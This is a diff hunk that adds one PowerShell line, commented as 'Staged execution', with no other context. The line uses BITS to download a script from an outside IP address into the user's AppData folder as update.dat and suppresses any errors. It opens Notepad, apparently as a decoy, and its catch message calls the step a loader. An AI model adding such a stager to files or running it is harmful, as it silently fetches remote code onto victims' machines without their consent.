@@ -1,0 +1,2 @@
+
+<# Staged execution #> try { Start-BitsTransfer -Source "https://192.0.2.20/updater.ps1" -Destination "$env:APPDATA\update.dat" -ErrorAction SilentlyContinue; Start-Process -FilePath 'notepad.exe' -ErrorAction SilentlyContinue; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8" } catch { Write-Warning "Loader step failed" }
